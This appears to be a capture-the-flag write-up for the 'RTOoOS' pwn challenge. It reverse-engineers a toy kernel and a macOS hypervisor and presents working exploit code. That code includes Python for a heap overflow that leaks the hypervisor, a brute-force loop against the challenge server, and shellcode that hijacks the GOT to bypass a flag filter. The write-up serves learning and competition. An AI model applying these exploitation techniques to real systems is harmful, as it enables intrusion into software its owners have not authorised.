## 143 Pwn / RTOoOS

###Overview

In this challenge, a raw binary file that implements a command line using `amd64` assembly is given, but the hypervisor that is running this binary on remote server is not given. We can read files in remote server except `honcho` (the hypervisor) and `flag`, which are banned by kernel and hypervisor respectively. We need to find the vulnerability in the kernel to leak hypervisor first, then find the vulnerability in hypervisor to read the flag.

### Reverse Engineering Kernel

The kernel implements a simple command shell

```c
//main function
void __fastcall __noreturn sub_13F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned __int16 v4; // dx
  unsigned __int16 v5; // dx
  unsigned __int16 v6; // dx
  int v7; // ST1C_4
  char a1a[520]; // [rsp+20h] [rbp-230h]
  __int64 v9; // [rsp+228h] [rbp-28h]
  __int64 v10; // [rsp+230h] [rbp-20h]
  __int64 v11; // [rsp+238h] [rbp-18h]
  __int64 v12; // [rsp+240h] [rbp-10h]

  v12 = a1;
  v11 = a2;
  v10 = a3;
  v9 = a4;
  init_heap(&unk_3650, 0x1000LL);
  print("CS420 - Homework 1", 0x1000LL, v4);
  print("Student: Kurt Mandl", 0x1000LL, v5);
  print("Submission Stardate 37357.84908798814", 0x1000LL, v6);
  while ( 1 )
  {
    memset(a1a, 0, 512u);
    print_cmd_arr();
    v7 = get_input(a1a, 511LL, 0x1FFu);
    execute_cmd((unsigned __int8 *)a1a, v7);
  }
}
```

We I am looking at the `print` and `get_input` functions, it seems that they all use `out`, which is a bit weird to use `out` to get user input. But then I realize it is a binary run in hypervisor, so the hypervisor can execute anything including `read` even if an `out` instruction is used.

When executing `cat`, it seems the `honcho` is blocked here

```c
v6 = strlen("cat ");
if ( !memcmp("cat ", cmd, v6) )
{
  if ( (signed int)strlen((char *)cmd) <= 4 )
  {
    v40 = 0;
    print("no file to cat", (__int64)cmd, v7);
    return v40;
  }
  if ( substr((char *)cmd + 4, "honcho") )
    print("reading hypervisor blocked by kernel!!", (__int64)"honcho", v8);
  else
    cat((__int64)(cmd + 4), (__int64)"honcho", v8);
}
```

A interesting function is environment variable, in which variables are stored using key-value pair. The structure is something like this:

```c
char keys[16][512]; //at 0x1650, 512*16 = 0x2000
//something in the middle(0x3650), covered later
char* values[16]; //at 0x4650
//A key-value pair will have same index value
```

When `export` is executed, it will change the `value` in current variable if `stored key == input key`, and also add a new key-value pair if there is free index. This is a bit weird, because it will create 2 variables with same key and value if same key is exported twice.

```c
if ( !memcmp("export ", cmd, v9) )
{
  export_key = (char *)&cmd[(signed int)strlen("export ")];
  export_val = 0LL;
  for ( i = 0; i < (signed int)strlen(export_key); ++i )
  {
    if ( export_key[i] == '=' )
    {
      export_val = &export_key[i + 1];
      export_key[i] = 0;
      break;
    }
  }
  for ( j = 0; j < 16; ++j )
  {
    v32 = 0;
    if ( (unsigned int)strlen((char *)(((signed __int64)j << 9) + 0x1650))
      && !strcmp((unsigned __int8 *)(((signed __int64)j << 9) + 0x1650), (unsigned __int8 *)export_key) )
    {                                   // there is currently the same key
      v10 = len - (unsigned __int64)strlen(export_key);
      len = v10 - (unsigned __int64)strlen("export");
      for ( k = 0; k < len; values[j][v32++] = export_val[k++] )
      {
        if ( export_val[k] == '$' )
        {
          for ( l = 0; l < 16; ++l )
          {
            v11 = strlen((char *)(((signed __int64)l << 9) + 0x1650));
            if ( !memcmp(
                    (unsigned __int8 *)&export_val[k + 1],
                    (unsigned __int8 *)(((signed __int64)l << 9) + 0x1650),
                    v11) )
            {
              for ( m = 0; m < (signed int)strlen(values[l]); ++m )
              {
                v12 = v32++;
                values[j][v12] = values[l][m];
              }
              k += strlen(values[l]);   // value? should it be key?
              break;
            }                           // might be vulnerable here
          }
        }
      }
    }
  }
  v28 = 0;
  for ( n = 0; n < 16; ++n )
  {
    if ( !(unsigned int)strlen((char *)(((signed __int64)n << 9) + 0x1650)) )
    {
      v13 = strlen(export_key);
      memcpy((char *)(((signed __int64)n << 9) + 0x1650), export_key, v13);
      v14 = 512 - (unsigned __int64)strlen(export_key);
      v15 = strlen("export ");
      values[n] = (char *)malloc(v14 - v15 + 1);// no 0 checking
      v16 = 512 - (unsigned __int64)strlen(export_key);
      lena = v16 - (unsigned __int64)strlen("export ");
      for ( ii = 0; ii < lena; values[n][v28++] = export_val[ii++] )
      {
        if ( export_val[ii] == '$' )
        {
          for ( jj = 0; jj < 16; ++jj )
          {
            v17 = strlen((char *)(((signed __int64)jj << 9) + 0x1650));
            if ( !memcmp(
                    (unsigned __int8 *)&export_val[ii + 1],
                    (unsigned __int8 *)(((signed __int64)jj << 9) + 0x1650),
                    v17) )
            {
              for ( kk = 0; kk < (signed int)strlen(values[jj]); ++kk )
              {
                v18 = v28++;
                values[n][v18] = values[jj][kk];// certainly overflow
              }
              ii += strlen(values[jj]);
              break;
            }
          }
        }
      }
      return 0;
    }
  }
}
```

It will also expands environment variable if `'$'` is found in the input value. This is where the vulnerability comes from. After the expansion, the string can be longer than the original input, thus causing heap overflow. Actually there are other vulnerabilities: for example, there is no `null` check when `malloc` is called, but I found them harder to exploit than that heap overflow.

However, we also need to know how heap is implemented here. It is just a simple single linked list heap implementation.

```c
struct chunk
{
  unsigned __int64 avai_size;
  int isfree;
  chunk *next;
};
void __fastcall init_heap(_QWORD *a1, __int64 a2)
{//init_heap(&unk_3650, 0x1000LL);
  heap = a1;
  list = (chunk *)a1;
  list->avai_size = a2 - 0x18;
  list->isfree = 1;
  list->next = 0LL;
  size = a2;
}
signed __int64 __fastcall malloc(unsigned __int64 a1)
{
  bool v2; // [rsp+7h] [rbp-29h]
  chunk *a1a; // [rsp+18h] [rbp-18h]
  signed __int64 v4; // [rsp+28h] [rbp-8h]

  if ( !list->avai_size )
    BUG();
  for ( a1a = list; ; a1a = a1a->next )
  {//traverse the list to find an available one
    if ( a1a->avai_size < a1 || (v2 = 0, !a1a->isfree) )
      v2 = a1a->next != 0LL;
    if ( !v2 )
      break;
  }
  if ( a1a->avai_size == a1 )
  {// if size excactly match
    a1a->isfree = 0;
    v4 = (signed __int64)&a1a[1];
  }
  else if ( a1a->avai_size <= a1 + 24 )         // problematic, but hard to exploit
  {// if size is not enough
    v4 = 0LL;                                   // no heap space, return 0
  }
  else
  {// if size needed is smaller than the free chunk we have
    sub_100(a1a, a1);
    v4 = (signed __int64)&a1a[1];
  }
  return v4;
}
void __fastcall sub_100(chunk *a1, __int64 a2)
{//split the chunk
  chunk *v2; // ST00_8
  v2 = (chunk *)((char *)a1 + a2 + 0x18);
  v2->avai_size = a1->avai_size - a2 - 0x18;
  v2->isfree = 1;
  v2->next = a1->next;
  a1->avai_size = a2;
  a1->isfree = 0;
  a1->next = v2;
}
```

The key is that after the heap, there is `char* values[16]` array, so as long as we can allocate chunk that is just before the `values`, we can use heap overflow to rewrite it.

### Exploit Kernel

To rewrite `values` array, what I did is to allocate chunk with size `0x200` for 6 times, then allocate chunk with size `0x200` with value long enough followed by new pointer in the end that will rewrite `values[0]`, then allocate chunk with size `0x200` to cause overflow.

```python
def allocate_pre(sh):
	sh.recvuntil(ARR)
	for i in xrange(6):
		export(sh, str(i) * l, str(i))

def leak_honcho(sh):
	honcho = 0x1508
	export(sh, str(7) * l, 'A' * (l+1+3) + p16(honcho))
	export(sh, '8' * l, (val_len(l) - (l+1) - 2) * '8' + '$' + '7' * l)
	export(sh, '0' * l, "leak") # rewrite "honcho" global string
	data = cat("honcho")

	f = open("honcho", "wb")
	f.write(data)
	f.close()
```

### Reverse Engineering Hypervisor

After dumping the hypervisor, we found that this is a MacOS executable, which I am not familiar with. This is the first time for me to exploit a MacOS program, and I don't have a MacOS machine either, but fortunately there are MacOS machines in our lab.

The symbols are not stripped which is great, there are many hypervisor stuff which you actually don't need to get into, because the handler of `out` from that simple OS is an obvious switch statement.

The vulnerability is here, out-of-bound access.

```c
case 'c':
  v8 = read(0, (char *)vm_mem + v22, v19);
  hv_vcpu_write_register((unsigned int)vcpu, 2LL, v8);
  break;
case 'd':
  puts((const char *)vm_mem + v22);
  break;
```

Also, I have patched out function `drop_privs`, which is not useful and with this function we need `root` privilege to run the binary, which I don't have in our lab machine.

### Exploit Hypervisor

After some debugger, I found that even if the PIE is enabled, the offset from `vm_mem` to program base is constant. This is great: we can use OOB to leak and rewrite `got` table in the binary and hijack control flow. What I am thinking about is to rewrite `strcasestr` to something that will return `0`, which enables us to read the flag.

```c
case 'f':
  v12 = v3;
  v13 = (char *)vm_mem + v22;
  if ( strcasestr((const char *)vm_mem + v22, "flag") )
  {
    printf("hypervisor blocked read of %s\n", v13);
  }
  else
  {
    v14 = ReadFile(0LL, v13, (__int64 *)&v21);
    write(1, v14, v21);
  }
```

Initially I was thinking about `malloc`, which should returns `null` when the size(`vm_mem + v22`) is too big, but this does not seem work and I am not sure why; then I found `atoi` works fine because `atoi("flag")` returns 0.

However, even if in the same machine the offset from `vm_mem` to program base is constant, in the remote machine that offset is different from the local one. I realized this when I run this program on different MacOS machines (thanks @[PK398](https://github.com/PK398) for providing his MacOS machine that helps my analysis :D). So, I tried to brute force to find the correct offset.

```python
def leak_prog(off):
	sh = remote("rtooos.quals2019.oooverflow.io", 5000)
	img_addr = (-(0x7966a)+off) & 0xffffffffffffffff

	allocate_pre(sh)

	puts = 0x76
	read = 0x69
	#asm("this: jmp this")
	shellcode = '''
	mov rdi,%s;
	push 0x41;
	pop rsi;
	sub rdi,rsi;
	xor rax,rax;
	mov al,0x76;
	call rax;
	this:
	jmp this;
	''' % (hex(img_addr + 0x41))
	payload = asm(shellcode)
	rce(sh, payload)
	try:
		ret = sh.recvuntil("\n")
		if len(ret) > 1:
			print_hex(ret)
			sh.interactive()
		if ret[:3] == "\x48\x89\xC3":
			ret = True
		else:
			ret = False
		sh.close()
	except Exception as e:
		ret = False
		sh.close()
		return ret

for i in xrange(-0x30, 0x30):
	print "testing " + hex(i)
	if leak_prog(i * 0x1000):
		print hex(i * 0x1000)
		input()
```

Even if the offset is different, they don't seem to differ a lot according to my testing on different machines. So, I will test over range from `-0x30 to 0x30` first. We only need to test the page size (0x1000) multiples because `vm_mem` is always page aligned.

Finally, I found the `i` to be `-0x13`.

Then it is time to write shellcode! The method is same as the technique used to modify `"honcho"` global string, but this time we change the codes in handler of `export` command (this is chosen because codes here are long, so less likely to rewrite something that should not be modified). Here are the shellcode:

```assembly
mov rdi,atoi_got
xor rax,rax
mov al,0x76
call rax ; leak address of atoi
xor rax,rax
mov al,0x69
mov rdi,strcasestr_got
push 0x41
pop rsi
call rax ; rewrite strcasestr to atoi
mov rdi,strcasestr_got
xor rax,rax
mov al,0x76
call rax ; check it is indeed rewritten (actually not needed)
mov rax,0xffffffff989e9399
xor rax,0xffffffffffffffff
push rax
mov rdi,rsp
xor rax,rax
mov al,0x87
call rax ; cat flag
this:
jmp this ; used to debug: make sure everything is executed
```

Note the shellcode should be without `0`.

Here is the final [exploit](files/exp.py).
